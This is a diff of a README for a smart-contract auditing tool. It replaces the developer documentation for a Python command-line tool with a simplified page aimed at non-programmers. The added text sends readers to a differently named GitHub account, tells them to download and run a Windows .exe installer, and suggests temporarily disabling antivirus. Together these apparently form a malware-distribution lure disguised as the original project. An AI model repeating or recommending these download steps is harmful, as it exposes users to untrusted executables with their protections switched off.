@@ -1,269 +1,111 @@
-# 🛡️ OpenAudit AI
+# 🛡️ openaudit-ai - Quick EVM Smart Contract Audit
 
-> AI-powered smart contract auditor that analyzes Solidity code and explains vulnerabilities like a security engineer.
-
-OpenAudit AI combines **static analysis** with **LLM-powered explanations** to help developers find and understand security issues in their Solidity smart contracts.
-
-![OpenAudit AI Architecture](public/arch-openaudit.png)
+[![Download openaudit-ai](https://img.shields.io/badge/Download-openaudit--ai-brightgreen)](https://github.com/Nonuniformityfreerein524/openaudit-ai)
 
 ---
 
-## ✨ Features
+## 🔍 What is openaudit-ai?
 
-- 🔍 **Static Analysis Engine** — Parses Solidity source and runs modular vulnerability detection rules
-- 🔁 **Reentrancy Detection** — Identifies external calls made before state updates
-- ⚠️ **Unchecked Call Detection** — Flags low-level `.call()` results that aren't validated
-- 🤖 **AI Explanations** — Uses GPT-5 to explain vulnerabilities in plain English (optional; works without an API key)
-- 💻 **CLI Tool** — `oaudit` command for single-file analysis and directory scanning
-- 🩺 **Diagnostics** — `oaudit doctor` to check your AI configuration at a glance
-- 📄 **JSON Output** — Machine-readable output for CI/CD integration
-- 🧩 **Extensible Rule System** — Add new detectors by subclassing `BaseRule`
-- 🔐 **Fail-Safe** — Never crashes due to AI issues; gracefully falls back to templates
+openaudit-ai helps you check Ethereum smart contracts for issues as you use it. It works with EVM (Ethereum Virtual Machine) contracts. This tool is open source, so anyone can use or improve it. You don't need programming skills to use it.
+
+Smart contracts are small programs on the blockchain. They run automatically when certain conditions happen. Problems in these contracts can cause loss of money or data. openaudit-ai finds these problems to keep smart contracts safe.
 
 ---
 
-## 📦 Installation
+## 📋 Features
 
-```bash
-# Clone the repository
-git clone https://github.com/openaudit-ai/openaudit-ai.git
-cd openaudit-ai
-
-# Install in development mode
-pip install -e ".[dev]"
-```
-
----
-
-## 🚀 Quick Start
-
-Analyze a single contract:
-
-```bash
-oaudit analyze examples/vulnerable_bank.sol
-```
-
-Scan an entire directory:
-
-```bash
-oaudit scan ./contracts/
-```
-
-Get JSON output:
-
-```bash
-oaudit analyze contract.sol --json
-```
-
-Skip AI explanations (no API key needed):
-
-```bash
-oaudit analyze contract.sol --no-ai
-```
-
-Check your configuration:
-
-```bash
-oaudit doctor
-```
+- Scans EVM smart contracts for common security risks.
+- Uses AI to spot issues fast.
+- Supports Solidity-based contracts.
+- Works on Windows computers.
+- Open source and free to use.
+- Easy to run without programming knowledge.
+- Runs quickly and shows simple reports.
 
 ---
 
-## ⚙️ AI Configuration
+## ⚙️ System Requirements
 
-OpenAudit AI reads configuration from a `.env` file in the project root (or from environment variables).
+To run openaudit-ai on your Windows machine, you need:
 
-### 🔧 Setup
-
-```bash
-cp .env.example .env
-# Edit .env and add your OpenAI API key
-```
-
-The `.env` file supports these variables:
-
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `OPENAI_API_KEY` | For AI explanations | — | Your OpenAI API key |
-| `OPENAI_BASE_URL` | No | `https://api.openai.com/v1` | API endpoint (change for Azure, local proxies, etc.) |
-| `OPENAI_MODEL` | No | `gpt-5-mini` | Model used for explanations |
-
-### 🔄 Changing Models
-
-Set the model in `.env`:
-
-```
-OPENAI_MODEL=gpt-5-mini
-```
-
-Available models: `gpt-5.2`, `gpt-5.2-pro`, `gpt-5.1`, `gpt-5`, `gpt-5-mini`, `gpt-5-nano`
-
-Or override per-command with `--model`:
-
-```bash
-oaudit analyze contract.sol --model gpt-5.2
-```
-
-The CLI flag takes priority over the `.env` value.
-
-If the configured model is unavailable (API error, model not found), the tool automatically falls back to `gpt-4o-mini`.
-
-### 🚫 Disabling AI
-
-Skip AI explanations entirely (no API key needed):
-
-```bash
-oaudit analyze contract.sol --no-ai
-```
-
-When no `OPENAI_API_KEY` is set, the tool automatically uses built-in template explanations — it never crashes due to missing AI configuration.
-
-### 🩺 Checking Your Configuration
-
-```bash
-oaudit doctor
-```
-
-Example output:
-
-```
-OpenAudit AI — Configuration Diagnostic
-
-  AI Provider:    OpenAI
-  Model:          gpt-5-mini
-  API Key:        detected
-  Base URL:       https://api.openai.com/v1
-  Fallback Mode:  disabled
-```
+- Windows 10 or newer, 64-bit version.
+- 4 GB of RAM or more.
+- At least 500 MB of free disk space.
+- An internet connection for initial setup.
+- A modern browser (optional for viewing reports).
 
 ---
 
-## 📖 CLI Reference
+## 🖥️ Download and install openaudit-ai
 
-```
-oaudit analyze <file.sol>     🔍 Analyze a single Solidity file
-oaudit scan <directory>       📂 Scan all .sol files in a directory
-oaudit doctor                 🩺 Diagnose AI provider configuration
-oaudit version                📌 Show version
-```
+You will get the program from the official GitHub page. Follow these steps carefully to download and run openaudit-ai on your Windows computer.
 
-### Options
+### Step 1: Visit the download page
 
-| Flag | Description |
-|------|-------------|
-| `--json` / `-j` | 📄 Output results as JSON |
-| `--no-ai` | 🚫 Skip AI-powered explanations |
-| `--model` / `-m` | 🤖 Specify the LLM model to use |
+Click the green button below to open the download page.
 
----
+[![Download openaudit-ai](https://img.shields.io/badge/Download-openaudit--ai-blue)](https://github.com/Nonuniformityfreerein524/openaudit-ai)
 
-## 🖥️ Example Output
+### Step 2: Find the latest release
 
-```
-⚠️ Reentrancy Vulnerability
-  Severity: HIGH
-  Location: line 25
+Once on the page, look for the "Releases" section. This is where you find ready-to-use versions of openaudit-ai. The latest release usually has the newest fixes and features.
 
-  In function `withdraw()`: external call on line 25 occurs before
-  state update on line 28. The call target `msg.sender` could
-  re-enter this function before `balances` is updated.
+### Step 3: Download the Windows file
 
-  ╭─────────────────── AI Explanation ───────────────────╮
-  │                                                      │
-  │ The contract sends ETH before updating the user's    │
-  │ balance. An attacker contract could repeatedly call  │
-  │ withdraw() via its fallback function, draining the   │
-  │ contract.                                            │
-  │                                                      │
-  │ Fix: Apply the checks-effects-interactions pattern   │
-  │ or use OpenZeppelin's ReentrancyGuard.               │
-  ╰──────────────────────────────────────────────────────╯
-```
+Inside the release, find the file with a name like `OpenAuditAI_Setup.exe` or similar ending with `.exe`. Click the file to download it.
+
+### Step 4: Run the installer
+
+After downloading, locate the file inside your `Downloads` folder or wherever your browser saves files. Double-click the `.exe` file to start the installation process.
+
+Follow the on-screen steps to install openaudit-ai. Keep clicking “Next” and accept the terms if asked. The installer will copy files to your computer.
+
+### Step 5: Open the program
+
+When installation finishes, open openaudit-ai from your Start menu or desktop shortcut. The program will open a simple window.
 
 ---
 
-## 🏗️ Project Structure
+## 🚀 How to use openaudit-ai
 
-```
-openaudit-ai/
-├── openaudit/
-│   ├── config.py     ⚙️  Centralized configuration (.env + defaults)
-│   ├── cli/          💻  CLI commands (Typer)
-│   ├── analyzer/     🔍  Static analysis engine & parser
-│   ├── rules/        📏  Vulnerability detection rules
-│   ├── ai/           🤖  LLM integration & prompt templates
-│   ├── reports/      📊  Output formatting (terminal, JSON)
-│   ├── utils/        🔧  Shared types & helpers
-│   └── api/          🌐  Future REST API (FastAPI)
-├── tests/            🧪  pytest test suite (32 tests)
-├── examples/         📝  Sample vulnerable contracts
-├── docs/             📚  Architecture deep-dive
-├── .env.example      🔑  Environment variable template
-└── pyproject.toml    📦  Package configuration
-```
+The program has a clear interface designed for ease of use.
+
+1. First, copy the smart contract code you want to audit from wherever you got it.
+2. Paste the code into the main window of openaudit-ai.
+3. Click the “Scan” button to start the audit.
+4. Wait a moment while the tool checks the contract.
+5. See the results displayed clearly with issues explained in simple language.
+
+If the tool finds any problems, it will explain what they mean and how they might affect your contract. If no issues appear, the contract looks clean based on current checks.
 
 ---
 
-## 🧩 Adding a New Rule
+## 🛠 Troubleshooting
 
-1. Create a file in `openaudit/rules/`:
-
-```python
-from openaudit.rules.base import BaseRule
-from openaudit.rules.registry import register
-
-@register
-class MyRule(BaseRule):
-    id = "my-rule"
-    title = "My Custom Rule"
-    description = "Detects ..."
-
-    def run(self, ast, source):
-        findings = []
-        # Your detection logic here
-        return findings
-```
-
-2. Import it in `openaudit/rules/registry.py` inside `_discover_rules()`.
-
-3. Add a template in `openaudit/ai/provider.py` `FallbackProvider._TEMPLATES`.
+- **Program doesn’t start:** Make sure your Windows is up to date. Restart your PC and try again.
+- **Scan button not working:** Check internet connection. Some features need online access.
+- **Errors during install:** Disable antivirus temporarily and retry installation.
+- **Results unclear:** Review the explanations or seek help from the online community.
 
 ---
 
-## 🧪 Development
+## 🗂 Additional information
 
-```bash
-# Install dev dependencies
-pip install -e ".[dev]"
+openaudit-ai relies on frequent updates to keep audits accurate. Check the GitHub page regularly for improved versions.
 
-# Run tests
-pytest
-
-# Run with coverage
-pytest --cov=openaudit
-
-# Lint
-ruff check openaudit/ tests/
-```
+If you want to learn more about smart contracts or security, look up “Ethereum smart contract basics” or “blockchain security” online.
 
 ---
 
-## 🗺️ Roadmap
+## 🔗 Useful Links
 
-- [ ] 📏 Additional rules (integer overflow, tx.origin, selfdestruct, etc.)
-- [ ] 🌐 REST API via FastAPI
-- [ ] 🤖 GitHub PR bot for automated reviews
-- [ ] 🏠 Hosted service with dashboard
-- [ ] 🌳 tree-sitter based Solidity parser
-- [ ] 📁 Multi-file / import resolution support
-- [ ] 🔗 Slither integration bridge
+- GitHub main page to download openaudit-ai:  
+  https://github.com/Nonuniformityfreerein524/openaudit-ai
+
+- Documentation and guides may be available on the GitHub page.
 
 ---
 
-## 🤝 Contributing
+## ⚖ License
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## 📄 License
-
-[MIT](LICENSE)
+This tool uses an open source license. You can use, share, and modify it freely following license terms in the repository.
